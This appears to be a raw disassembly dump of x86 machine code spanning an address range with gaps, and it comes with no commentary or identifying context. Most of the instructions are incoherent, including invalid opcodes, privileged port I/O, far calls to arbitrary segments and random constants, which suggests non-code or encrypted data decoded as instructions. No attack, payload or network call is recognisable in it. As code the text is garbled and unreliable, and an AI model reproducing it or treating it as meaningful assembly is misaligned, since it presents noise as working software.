  42f0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0e5:	cmp    dl,BYTE PTR [eax]
  42f0e7:	scas   eax,DWORD PTR es:[edi]
  42f0e8:	call   0x4942:0x1f1cfecc
  42f0ef:	test   al,0x87
  42f0f1:	jmp    0x42f168
  42f0f3:	jle    0x42f08d
  42f0f5:	gs xchg ebx,eax
  42f0f7:	adc    bl,BYTE PTR [edi-0x77b509ba]
  42f0fd:	repz ds stc 
  42f100:	fstp   DWORD PTR [esi+0x7b671182]
  42f106:	ds mov dh,0x70
  42f109:	les    esp,FWORD PTR [edx]
  42f10b:	cmp    dl,BYTE PTR [edx+0x6a]
  42f10e:	inc    ebx
  42f10f:	inc    edi
  42f110:	push   esp
  42f111:	out    0x4f,al
  42f113:	push   0xfffffff7
  42f115:	mov    cl,0x3
  42f117:	cmp    DWORD PTR [edi-0x1c6343e6],ebp
  42f11d:	inc    esi
  42f11e:	cmp    BYTE PTR [ecx+0x7643d282],0xad
  42f125:	outs   dx,DWORD PTR ds:[esi]
  42f126:	lods   eax,DWORD PTR ds:[esi]
  42f127:	and    ah,al
  42f129:	inc    eax
  42f12a:	adc    al,0x61
  42f12c:	sub    dl,BYTE PTR [edx]
  42f12e:	int3   
  42f12f:	ins    DWORD PTR es:[edi],dx
  42f130:	mov    edx,0x5e45b57
  42f135:	bound  ebp,QWORD PTR [ebp+0xf78d13e]
  42f13b:	cmp    BYTE PTR [edx+0x4938b053],dl
  42f141:	fadd   DWORD PTR [ebp-0x63]
  42f144:	loope  0x42f14d
  42f146:	and    bh,BYTE PTR ds:0xb804769c
  42f14c:	outs   dx,BYTE PTR ds:[esi]
  42f14d:	fprem  
  42f150:	jle    0x42f13e
  42f152:	or     al,0x6a
  42f154:	out    dx,al
  42f155:	adc    ch,dl
  42f157:	push   edi
  42f158:	pop    ebp
  42f159:	xor    ebx,DWORD PTR [eax-0x7d]
  42f15c:	sbb    eax,0x533c4762
  42f161:	(bad)
  42f164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f165:	and    ch,dh
  42f167:	push   ebx
  42f168:	mov    edx,0xbb048834
  42f16d:	add    edi,esp
  42f16f:	fldl2e 
  42f171:	pop    esi
  42f172:	pop    eax
  42f173:	stos   DWORD PTR es:[edi],eax
  42f174:	add    eax,DWORD PTR [esi+0x1a]
  42f177:	mov    dl,BYTE PTR [ecx-0x4e47ca7d]
  42f17d:	(bad)  
  42f17e:	lock sar esi,0x1d
  42f182:	pop    esp
  42f183:	jle    0x42f16d
  42f185:	out    0xb,al
  42f187:	pop    DWORD PTR [ecx+0x21cab63b]
  42f18d:	je     0x42f164
  42f18f:	int    0x0
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	jge    0x42f256
  42f202:	or     eax,0x1f86486
  42f207:	add    BYTE PTR [ecx+eax*1],al
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	out    dx,eax
  42f20d:	test   DWORD PTR [esi],ecx
  42f20f:	push   0xfffffff2
  42f211:	daa    
  42f212:	mov    ebx,0x6e3bb270
  42f217:	jmp    0x42f23f
  42f219:	fcomip st,st(0)
  42f21b:	in     al,dx
  42f21c:	out    0xf1,eax
  42f21e:	push   edx
  42f21f:	fnstsw WORD PTR [ebp-0x5c]
  42f222:	das    
  42f223:	cs retf 
  42f225:	adc    DWORD PTR [edi-0x26],edi
  42f228:	xor    edi,DWORD PTR [ebx-0x6]
  42f22b:	rcr    BYTE PTR [edi+edx*1+0x4c],cl
  42f22f:	lahf   
  42f230:	jp     0x42f275
  42f232:	js     0x42f1c4
  42f234:	aaa    
  42f235:	popa   
  42f236:	pop    ebx
  42f237:	cli    
  42f238:	dec    ebp
  42f239:	into   
  42f23a:	and    eax,0x1b15c744
  42f23f:	sub    ah,al
  42f241:	test   ah,al
  42f243:	popf   
  42f244:	xor    eax,0x2b620ad
  42f249:	aam    0x93
  42f24b:	sbb    BYTE PTR [ebp-0x5cb14a83],ch
  42f251:	sbb    eax,0x54a9678a
  42f256:	and    BYTE PTR [edi+0x57],bl
  42f259:	add    eax,0x75c93864
  42f25e:	add    al,0x11
  42f260:	je     0x42f1ea
  42f262:	(bad)  [eax+edi*8-0x5d]
  42f266:	fwait
  42f267:	stc    
  42f268:	sub    al,0xbf
  42f26a:	fidiv  WORD PTR [edi+0x3]
  42f26d:	psubsb mm5,mm4
  42f270:	add    al,0xaa
  42f272:	fdivr  QWORD PTR [edi-0x3e]
  42f275:	mov    BYTE PTR [esi+0x7f23a9f5],dh
  42f27b:	or     ebx,eax
  42f27d:	test   BYTE PTR [edx-0x6da3e956],dl
  42f283:	xchg   ecx,eax
  42f284:	retf   0xfb23
  42f287:	or     BYTE PTR [edi],dl
  42f289:	mov    ch,bh
  42f28b:	ins    DWORD PTR es:[edi],dx
  42f28c:	ins    DWORD PTR es:[edi],dx
  42f28d:	popa   
  42f28e:	in     al,0x5b
  42f290:	pop    edi
  42f291:	in     eax,0xe5
  42f293:	cld    
  42f294:	jg     0x42f2bd
  42f296:	popa   
  42f297:	sbb    al,0xde
  42f299:	and    BYTE PTR [eax],0xd8
  42f29c:	fld    DWORD PTR [esi-0x1]
  42f29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2a0:	dec    ebx
  42f2a1:	ret    0x7df
  42f2a4:	dec    ebx
  42f2a5:	lock (bad) 
  42f2a7:	scas   eax,DWORD PTR es:[edi]
  42f2a8:	icebp  
  42f2a9:	adc    DWORD PTR [ecx+0x1fa649ed],eax
  42f2af:	cs cmp al,0xc7
  42f2b2:	xchg   ecx,eax
  42f2b3:	jb     0x42f282
  42f2b5:	push   0x8ba99675
  42f2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2bb:	ja     0x42f2b6
  42f2bd:	dec    edi
  42f2be:	scas   eax,DWORD PTR es:[edi]
  42f2bf:	lds    edi,FWORD PTR [ebx+0x94d1e66]
  42f2c5:	(bad)  
  42f2c6:	fistp  DWORD PTR [ebx-0x5438db6d]
  42f2cc:	xchg   ecx,eax
  42f2cd:	sti    
  42f2ce:	repz ficomp DWORD PTR [eax+ebx*8]
  42f2d2:	aas    
  42f2d3:	leave  
  42f2d4:	mov    esp,0xef18dc6c
  42f2d9:	pushf  
  42f2da:	adc    DWORD PTR [eax],edi
  42f2dc:	pop    ecx
  42f2dd:	jmp    0xced18fd2
  42f2e2:	je     0x42f2ec
  42f2e4:	pop    ebp
  42f2e5:	dec    ecx
  42f2e6:	mov    DWORD PTR [esi-0x53],edi
  42f2e9:	test   al,0xf0
  42f2eb:	xor    DWORD PTR [esi-0x4d],0xb19783b6
  42f2f2:	push   ss
  42f2f3:	and    edi,DWORD PTR [edx-0x53ba1068]
  42f2f9:	lea    dx,[ebp-0x2d]
  42f2fd:	cli    
  42f2fe:	sub    esi,ebx
  42f300:	mov    ds:0x24578675,eax
  42f305:	pop    eax
  42f306:	aad    0x89
  42f308:	popf   
  42f309:	inc    edi
  42f30a:	add    al,0x6e
  42f30c:	jno    0x42f34a
  42f30e:	mov    al,0x41
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	(bad)  
  42f381:	or     eax,0xf968fe4d
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    al,0x1
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	pushf  
  42f38d:	(bad)  
  42f38e:	nop
  42f38f:	pop    esi
  42f390:	mov    eax,0x21196127
  42f395:	neg    BYTE PTR [esi]
  42f397:	mov    ecx,0x30cbeac0
  42f39c:	pop    ebp
  42f39d:	nop
  42f39e:	aaa    
  42f39f:	(bad)  
  42f3a0:	cld    
  42f3a1:	and    BYTE PTR [esi-0x5f7b9b39],bl
  42f3a7:	lock arpl WORD PTR [ecx-0x3d24259a],di
  42f3ae:	mov    dl,0xb9
  42f3b0:	enter  0x31a6,0x8e
  42f3b4:	stos   BYTE PTR es:[edi],al
  42f3b5:	popf   
  42f3b6:	test   al,0x6b
  42f3b8:	push   eax
  42f3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3ba:	je     0x42f368
  42f3bc:	bound  ebp,QWORD PTR [edi]
  42f3be:	sbb    esp,edx
  42f3c0:	pop    esp
  42f3c1:	and    bl,dh
  42f3c3:	sti    
  42f3c4:	not    DWORD PTR [ebx+ecx*1-0x7a]
  42f3c8:	int    0x32
  42f3ca:	inc    edi
  42f3cb:	(bad)  
  42f3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3cd:	sbb    ebp,esi
  42f3cf:	ss xchg ebx,eax
  42f3d1:	bound  ebx,QWORD PTR [ecx-0x48536c84]
  42f3d7:	stos   DWORD PTR es:[edi],eax
  42f3d8:	in     al,0x26
  42f3da:	sub    DWORD PTR [edx-0x61896af8],ecx
  42f3e0:	int    0xf5
  42f3e2:	cmp    ebp,ecx
  42f3e4:	adc    cl,BYTE PTR [ecx]
  42f3e6:	popa   
  42f3e7:	push   ebx
  42f3e8:	mov    al,ds:0xde669633
  42f3ed:	xchg   ebp,eax
  42f3ee:	arpl   WORD PTR [ecx+esi*1-0x7299edaf],si
  42f3f5:	inc    esi
  42f3f6:	sbb    BYTE PTR [esi+0x13],ch
  42f3f9:	xchg   edi,eax
  42f3fa:	leave  
  42f3fb:	sub    eax,0xbcd67a88
  42f400:	sahf   
  42f401:	xor    edi,esi
  42f403:	(bad)  
  42f404:	call   0xf962:0xc41871cf
  42f40b:	hlt    
  42f40c:	xlat   BYTE PTR ds:[ebx]
  42f40d:	cmp    ebp,DWORD PTR [eax-0x108375ec]
  42f413:	push   edi
  42f414:	inc    edx
  42f415:	rol    DWORD PTR [eax],0x64
  42f418:	pop    ebp
  42f419:	repnz cld 
  42f41b:	arpl   WORD PTR [edi-0x4],ax
  42f41e:	dec    ecx
  42f41f:	cs retf 0xa232
  42f423:	or     cl,BYTE PTR [esi-0x1e]
  42f426:	jle    0x42f448
  42f428:	mov    BYTE PTR [eax],bh
  42f42a:	ss gs sbb eax,0xee6433e3
  42f431:	ret    
  42f432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f433:	fadd   DWORD PTR [edx-0x13]
  42f436:	xor    eax,0x8df8e8e5
  42f43b:	xor    esi,ebp
  42f43d:	adc    edx,DWORD PTR [esi+0x7f]
  42f440:	jno    0x42f40a
  42f442:	and    al,0xa0
  42f444:	imul   ebp,DWORD PTR [edi],0x3f3bfc19
  42f44a:	lods   eax,DWORD PTR ds:[esi]
  42f44b:	sub    eax,0x46fb354d
  42f450:	add    DWORD PTR [ebx-0x44f7d7cd],eax
  42f456:	imul   esi,edx,0xcb04b46f
  42f45c:	daa    
  42f45d:	bound  esi,QWORD PTR [ebp+0xc54a7e4]
  42f463:	lea    edi,[esp+edi*4]
  42f466:	fstp   DWORD PTR [edi-0x6b]
  42f469:	adc    al,0xf6
  42f46b:	mov    WORD PTR [eax+ebp*2-0x44bb7580],ss
  42f472:	cld    
  42f473:	xchg   bh,al
  42f475:	or     DWORD PTR [eax],eax
  42f477:	dec    edx
  42f478:	xchg   DWORD PTR [edi+eiz*8],edi
  42f47b:	mov    al,0x43
  42f47d:	cdq    
  42f47e:	scas   eax,DWORD PTR es:[edi]
  42f47f:	loope  0x42f486
  42f481:	inc    esi
  42f482:	push   esi
  42f483:	sahf   
  42f484:	jne    0x42f4c2
  42f486:	xlat   BYTE PTR ds:[ebx]
  42f487:	loope  0x42f4de
  42f489:	pop    esi
  42f48a:	adc    esp,DWORD PTR [ebx+0x7a2c77b3]
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	cmp    BYTE PTR [ebx-0x5932d99],0x1
  42f507:	add    BYTE PTR [ecx+eax*1],al
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	in     eax,0x97
  42f50e:	adc    DWORD PTR [esi-0x51],ebp
  42f511:	mov    DWORD PTR [eax],eax
  42f513:	icebp  
  42f514:	jle    0x42f499
  42f516:	xchg   esi,eax
  42f517:	xchg   esi,eax
  42f518:	jmp    0x977f:0x1b394065
  42f51f:	or     ah,BYTE PTR [edx+0x44]
  42f522:	add    ah,BYTE PTR [ecx-0x30]
  42f525:	push   esi
  42f526:	mov    ds:0xd2823047,eax
  42f52b:	xor    ah,BYTE PTR [esi+0x62c25d22]
  42f531:	cwde   
  42f532:	mov    ds:0xbe4433ea,al
  42f537:	mov    ebx,0x1339517b
  42f53c:	cdq    
  42f53d:	jle    0x42f4f7
  42f53f:	or     DWORD PTR [ebp+0x439c7037],edx
  42f545:	dec    ebp
  42f546:	pop    ecx
  42f547:	jbe    0x42f53d
  42f549:	pop    edi
  42f54a:	xor    ah,cl
  42f54c:	or     eax,DWORD PTR ds:0x6c67816b
  42f552:	inc    edx
  42f553:	mov    ecx,0xb927e067
  42f558:	into   
  42f559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f55a:	or     al,0xb4
  42f55c:	in     al,dx
  42f55d:	fdiv   DWORD PTR [edx-0x37]
  42f560:	pop    ebp
  42f561:	or     DWORD PTR [eax+ebx*8-0x65],edi
  42f565:	cli    
  42f566:	push   ss
  42f567:	(bad)  
  42f568:	sti    
  42f569:	ins    BYTE PTR es:[edi],dx
  42f56a:	push   0x9f9efed4
  42f56f:	mov    ebp,0xa22478f3
  42f574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f575:	dec    esp
  42f576:	sub    DWORD PTR [edi+0x1],0x7de9322a
  42f57d:	push   ss
  42f57e:	or     al,0xde
  42f580:	xchg   ebp,eax
  42f581:	imul   eax,DWORD PTR [ecx+0x453e206a],0x956e3484
  42f58b:	pop    ebp
  42f58c:	rol    DWORD PTR [ecx+0x565f0f83],1
  42f592:	sub    eax,0x2c2b6d95
  42f597:	lds    edi,FWORD PTR [esi+0x3a150fb9]
  42f59d:	inc    ebx
  42f59e:	jle    0x42f5dd
  42f5a0:	or     edi,DWORD PTR [esi]
  42f5a2:	je     0x42f5b6
  42f5a4:	rcr    ebx,0xfd
  42f5a7:	cld    
  42f5a8:	and    ch,ah
  42f5aa:	dec    esp
  42f5ab:	or     esi,0x92106b01
  42f5b1:	nop
  42f5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5b3:	mov    ebx,DWORD PTR [eax-0x322bbc81]
  42f5b9:	and    BYTE PTR [edx],bh
  42f5bb:	push   edx
  42f5bc:	mov    ch,0xe5
  42f5be:	loopne 0x42f554
  42f5c0:	lods   eax,DWORD PTR ds:[esi]
  42f5c1:	clc    
  42f5c2:	ds pop ds
  42f5c4:	push   0x3d
  42f5c6:	retf   
  42f5c7:	js     0x42f5d7
  42f5c9:	inc    ecx
  42f5ca:	pop    edi
  42f5cb:	mov    bl,BYTE PTR [esi+0x2e]
  42f5ce:	aam    0xc1
  42f5d0:	test   cl,ch
  42f5d2:	and    edi,DWORD PTR [eax+0x41]
  42f5d5:	cmp    eax,0x39cea1cd
  42f5da:	mov    edx,0xbdf0668a
  42f5df:	push   edi
  42f5e0:	jns    0x42f5db
  42f5e2:	lea    esi,[edi]
  42f5e4:	or     esp,0xffffff8e
  42f5e7:	inc    ebp
  42f5e8:	arpl   ax,bx
  42f5ea:	aas    
  42f5eb:	push   ecx
  42f5ec:	cli    
  42f5ed:	cmc    
  42f5ee:	scas   eax,DWORD PTR es:[edi]
  42f5ef:	sbb    eax,0xfbe400d7
  42f5f4:	sub    eax,0x24d8136d
  42f5f9:	sbb    al,0xb5
  42f5fb:	cmp    bl,BYTE PTR [edi+edi*8+0x7b2ebf46]
  42f602:	xor    eax,0x1f8a4cba
  42f607:	dec    ecx
  42f608:	dec    ecx
  42f609:	and    bh,BYTE PTR [edi]
  42f60b:	xor    al,0xc8
  42f60d:	stos   DWORD PTR es:[edi],eax
  42f60e:	cmp    al,0x96
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	jae    0x42f6b9
  42f682:	inc    edi
  42f683:	add    al,0x70
  42f685:	sti    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	mov    ch,BYTE PTR [esi-0x4a]
  42f68f:	int    0x38
  42f691:	leave  
  42f692:	(bad)  
  42f693:	sbb    ebx,ebx
  42f695:	xor    eax,0x1d0cc411
  42f69a:	in     eax,0x95
  42f69c:	dec    edi
  42f69d:	fst    DWORD PTR [ebx+0x731b4ef]
  42f6a3:	xor    al,0x78
  42f6a5:	ja     0x42f63e
  42f6a7:	aas    
  42f6a8:	std    
  42f6a9:	sar    DWORD PTR [edi+0xe],cl
  42f6ac:	aaa    
  42f6ad:	outs   dx,BYTE PTR ds:[esi]
  42f6ae:	jb     0x42f715
  42f6b0:	cli    
  42f6b1:	rdtsc  
  42f6b3:	mov    dh,0x7c
  42f6b5:	cmp    ecx,DWORD PTR [edi]
  42f6b7:	outs   dx,DWORD PTR ds:[esi]
  42f6b8:	shr    DWORD PTR [ebp+ebp*2-0x7c],0x2b
  42f6bd:	cwde   
  42f6be:	xchg   edi,eax
  42f6bf:	in     eax,0x49
  42f6c1:	sbb    al,0x1f
  42f6c3:	in     eax,0x7e
  42f6c5:	inc    ebx
  42f6c6:	(bad)  
  42f6c7:	sar    BYTE PTR [esi+0x40d41998],1
  42f6cd:	fadd   QWORD PTR [eax+0x6a]
  42f6d0:	adc    DWORD PTR [ebx+edi*4-0x60],ecx
  42f6d4:	push   esp
  42f6d5:	(bad)  
  42f6d6:	loop   0x42f6a3
  42f6d8:	ror    BYTE PTR [edx],0x4a
  42f6db:	xor    esi,DWORD PTR [ebp+0x10]
  42f6de:	and    eax,0x8dfaaff2
  42f6e3:	(bad)  
  42f6e4:	shl    ebx,1
  42f6e6:	inc    eax
  42f6e7:	cld    
  42f6e8:	nop
  42f6e9:	fs icebp 
  42f6eb:	(bad)  
  42f6ec:	fiadd  DWORD PTR [edx-0x6c]
  42f6ef:	and    eax,0x62695aa6
  42f6f4:	cdq    
  42f6f5:	nop
  42f6f6:	inc    eax
  42f6f7:	bound  edi,QWORD PTR [esi+edx*4]
  42f6fa:	in     al,dx
  42f6fb:	(bad)  
  42f6fc:	imul   ebx,DWORD PTR [edi-0x37],0x2f
  42f700:	cmp    ecx,esi
  42f702:	shr    DWORD PTR [ecx+edi*4-0x2bbdca5d],cl
  42f709:	(bad)  
  42f70a:	pop    ebp
  42f70b:	push   ds
  42f70c:	sbb    al,dl
  42f70e:	xlat   BYTE PTR ds:[ebx]
  42f70f:	xchg   ecx,eax
  42f710:	jg     0x42f765
  42f712:	cwde   
  42f713:	(bad)  
  42f714:	test   DWORD PTR [edx-0x37d5e34d],0x5383f911
  42f71e:	or     eax,0xf4269437
  42f723:	jl     0x42f758
  42f725:	gs sbb eax,0xa3c97b92
  42f72b:	cli    
  42f72c:	test   eax,0x8cb85ba6
  42f731:	lods   al,BYTE PTR ds:[esi]
  42f732:	dec    edx
  42f733:	popa   
  42f734:	scas   al,BYTE PTR es:[edi]
  42f735:	inc    esi
  42f736:	jecxz  0x42f79d
  42f738:	pop    ebp
  42f739:	call   0xfc4a:0x1c49071b
  42f740:	ja     0x42f708
  42f742:	clc    
  42f743:	or     eax,0x8e07574e
  42f748:	mov    al,0xe6
  42f74a:	fsub   DWORD PTR [edi+0x1417b3d]
  42f750:	ja     0x42f7ca
  42f752:	test   DWORD PTR [ebp+0x2443e87d],esi
  42f758:	fldcw  WORD PTR [edi]
  42f75a:	sbb    DWORD PTR [edi-0x80],esp
  42f75d:	xchg   edx,eax
  42f75e:	push   ecx
  42f75f:	jmp    0x42f771
  42f761:	sub    al,0x52
  42f763:	pop    edx
  42f764:	dec    esp
  42f765:	jg     0x42f715
  42f767:	xor    bl,ah
  42f769:	fld    DWORD PTR ds:0x29e7b493
  42f76f:	(bad)  
  42f773:	push   eax
  42f774:	push   0xffffff8d
  42f776:	rcl    BYTE PTR [edx-0x17],cl
  42f779:	mov    cl,BYTE PTR ds:0x2e1f2e4
  42f77f:	outs   dx,DWORD PTR ds:[esi]
  42f780:	xchg   ebp,esp
  42f782:	xchg   DWORD PTR [eax-0x4714e554],ebx
  42f788:	push   edx
  42f789:	call   FWORD PTR [esi+0x7b2c2fde]
  42f78f:	ret    0x0
	...
  42f7f2:	add    BYTE PTR [eax],al
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x292b54c7
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	je     0x42f84d
  42f80e:	inc    ebx
  42f80f:	int    0x91
  42f811:	pushf  
  42f812:	pop    esi
  42f813:	fs xchg esi,eax
  42f815:	xlat   BYTE PTR ds:[ebx]
  42f816:	dec    esi
  42f817:	clc    
  42f818:	mov    BYTE PTR [edx-0x105f4c2a],al
  42f81e:	jecxz  0x42f899
  42f820:	js     0x42f852
  42f822:	add    esi,esp
  42f824:	sub    DWORD PTR [ebx-0x3b],edx
  42f827:	push   ebx
  42f828:	jo     0x42f83a
  42f82a:	mov    ah,0xa6
  42f82c:	inc    edx
  42f82d:	dec    ebp
  42f82e:	fs inc edi
  42f830:	clc    
  42f831:	add    esi,edi
  42f833:	jecxz  0x42f815
  42f835:	sar    BYTE PTR [ecx],cl
  42f837:	fdivr  QWORD PTR [esp+ebx*4]
  42f83b:	(bad)  
  42f83c:	fisubr WORD PTR [ebx+0x33]
  42f83f:	outs   dx,DWORD PTR ds:[esi]
  42f840:	cmp    bl,0xbc
  42f843:	pop    ds
  42f844:	lahf   
  42f845:	or     al,0x58
  42f847:	sub    DWORD PTR [esi-0x1c],eax
  42f84a:	xor    al,0xf3
  42f84c:	in     eax,dx
  42f84d:	test   BYTE PTR [eax+edi*1+0x0],al
  42f851:	xchg   BYTE PTR [esi],cl
  42f853:	or     BYTE PTR [edx+eiz*4-0x78],bh
  42f857:	(bad)  
  42f858:	sti    
  42f859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f85a:	pop    ss
  42f85b:	jb     0x42f841
  42f85d:	xchg   BYTE PTR [ebx+0x5d],al
  42f860:	fs out dx,eax
  42f862:	jp     0x42f8d5
  42f864:	mov    cl,0xa6
  42f866:	neg    BYTE PTR [ecx+0x7b]
  42f869:	xchg   edx,eax
  42f86a:	(bad)  
  42f86b:	cld    
  42f86c:	xchg   ebp,eax
  42f86d:	adc    eax,0x29f5db7c
  42f872:	into   
  42f873:	mov    ds:0x614965cf,eax
  42f878:	sub    eax,0xefe0581b
  42f87d:	cmp    al,0x4d
  42f87f:	or     al,0xe8
  42f881:	cmp    eax,DWORD PTR [edx-0x78]
  42f884:	jmp    0x29082285
  42f889:	aaa    
  42f88a:	cmp    al,0x34
  42f88c:	mov    esp,0xdfe27dde
  42f891:	popf   
  42f892:	arpl   WORD PTR [eax+0x6ffee8b6],bp
  42f898:	std    
  42f899:	pusha  
  42f89a:	out    0x70,eax
  42f89c:	jns    0x42f8ed
  42f89e:	mov    ds:0x9f410436,eax
  42f8a3:	shr    DWORD PTR [eax+0x69],0xc6
  42f8a7:	push   0xffffff92
  42f8a9:	jns    0x42f906
  42f8ab:	xor    DWORD PTR [eax+0x73f4f99a],0xffffff98
  42f8b2:	lods   eax,DWORD PTR ds:[esi]
  42f8b3:	ret    
  42f8b4:	and    ebp,DWORD PTR [ebp+0x15]
  42f8b7:	inc    ecx
  42f8b8:	out    dx,al
  42f8b9:	xchg   edi,eax
  42f8ba:	pop    ss
  42f8bb:	mov    esp,0xb22767c2
  42f8c0:	popf   
  42f8c1:	and    DWORD PTR ds:0xff0442a0,0x4a
  42f8c8:	ds jle 0x42f942
  42f8cb:	push   edx
  42f8cc:	cmc    
  42f8cd:	push   ss
  42f8ce:	es sub al,0x1c
  42f8d1:	cmp    eax,0x3eedd4f2
  42f8d6:	or     DWORD PTR [edx],ecx
  42f8d8:	ror    BYTE PTR [eax-0x55],1
  42f8db:	icebp  
  42f8dc:	cmp    dl,BYTE PTR [eax]
  42f8de:	sbb    BYTE PTR [esi+0x56],cl
  42f8e1:	sub    al,0x68
  42f8e3:	mov    BYTE PTR [eax],bh
  42f8e5:	or     cl,ch
  42f8e7:	cs mov ebx,0xd4c7603c
  42f8ed:	int    0x1e
  42f8ef:	enter  0x65f4,0x3
  42f8f3:	in     al,dx
  42f8f4:	add    dl,BYTE PTR [eax]
  42f8f6:	out    dx,eax
  42f8f7:	dec    edx
  42f8f8:	xchg   ebp,eax
  42f8f9:	pushf  
  42f8fa:	ret    
  42f8fb:	fdivr  QWORD PTR [edi+ebx*4]
  42f8fe:	pop    eax
  42f8ff:	xchg   edi,eax
  42f900:	fdivr  DWORD PTR [edx]
  42f902:	xor    al,0xae
  42f904:	inc    edi
  42f905:	pusha  
  42f906:	sbb    BYTE PTR [ebx],dh
  42f908:	pop    ds
  42f909:	inc    edx
  42f90a:	cli    
  42f90b:	mov    eax,0x4621e996
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9e0
  42f981:	jbe    0x42f917
  42f983:	cwde   
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	sbb    BYTE PTR [ebp+0x12888e2c],bh
  42f992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f993:	push   ebx
  42f994:	fld    QWORD PTR [ecx]
  42f996:	mov    esp,0x22b6c729
  42f99b:	(bad)  
  42f99d:	xor    edi,edi
  42f99f:	mov    DWORD PTR [ebp-0x701588b2],0xa5188dce
  42f9a9:	call   0xc8710aa5
  42f9ae:	imul   eax,DWORD PTR [edx],0x32f14c1e
  42f9b4:	lods   eax,DWORD PTR ds:[esi]
  42f9b5:	mov    ebx,0xff42c8cd
  42f9ba:	(bad)  
  42f9bb:	popf   
  42f9bc:	call   0x1b855081
  42f9c1:	call   0xe6d90ca7
  42f9c6:	or     BYTE PTR [edi-0x31],0xcf
  42f9ca:	retf   0x7e4a
  42f9cd:	jo     0x42f9b5
  42f9cf:	sbb    al,0x21
  42f9d1:	fwait
  42f9d2:	mov    ebp,0x19ac2552
  42f9d7:	push   eax
  42f9d8:	cld    
  42f9d9:	xchg   ecx,eax
  42f9da:	or     al,0x52
  42f9dc:	xchg   edi,eax
  42f9dd:	cs xor bh,ah
  42f9e0:	sub    al,0xd5
  42f9e2:	jne    0x42fa4d
  42f9e4:	sbb    bl,BYTE PTR [eax+eax*2]
  42f9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9e8:	mov    ch,0xbd
  42f9ea:	xchg   ecx,eax
  42f9eb:	imul   esi,esp,0xffffff9c
  42f9ee:	add    DWORD PTR [edx-0x80],ebx
  42f9f1:	dec    eax
  42f9f2:	sub    BYTE PTR ds:0xca451864,0xb
  42f9f9:	pop    ss
  42f9fa:	in     al,dx
  42f9fb:	mov    al,0x5b
  42f9fd:	outs   dx,BYTE PTR ds:[esi]
  42f9fe:	adc    bh,dl
  42fa00:	pop    ss
  42fa01:	push   edi
  42fa02:	jg     0x42fa46
  42fa04:	sub    eax,0xf783b681
  42fa09:	pop    edx
  42fa0a:	xchg   ecx,eax
  42fa0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa0c:	shr    dh,1
  42fa0e:	hlt    
  42fa0f:	cdq    
  42fa10:	adc    BYTE PTR ds:0xb3d87006,bh
  42fa16:	cs cs push esi
  42fa19:	repz repnz cmp esi,DWORD PTR [ebp-0x35981e9d]
  42fa21:	fldcw  WORD PTR ds:0xa7e0947c
  42fa27:	add    cl,bl
  42fa29:	mov    eax,DWORD PTR [ebx+0x17]
  42fa2c:	cmp    DWORD PTR [ebp-0x2d],edx
  42fa2f:	cmp    DWORD PTR [esi-0x74358ff8],edi
  42fa35:	not    al
  42fa37:	sbb    ah,BYTE PTR [ebp+eax*8+0x709a7a2]
  42fa3e:	mov    ah,0xe1
  42fa40:	pop    ss
  42fa41:	shl    DWORD PTR [eax-0x3d],cl
  42fa44:	jmp    0x42fa16
  42fa46:	adc    eax,0x4042d9d8
  42fa4b:	jno    0x42fa2a
  42fa4d:	push   esi
  42fa4e:	xchg   esp,eax
  42fa4f:	and    cl,0x43
  42fa52:	out    0xf3,eax
  42fa54:	ss out 0x30,eax
  42fa57:	xacquire xchg WORD PTR ss:[ecx-0x2bdf0087],ax
  42fa60:	retf   
  42fa61:	xchg   BYTE PTR [ecx+0xf],ah
  42fa64:	adc    al,0x48
  42fa66:	inc    ecx
  42fa67:	cmp    BYTE PTR [edx+0x5a47c4eb],cl
  42fa6d:	dec    edx
  42fa6e:	inc    edx
  42fa6f:	fidiv  DWORD PTR [ebp-0x12]
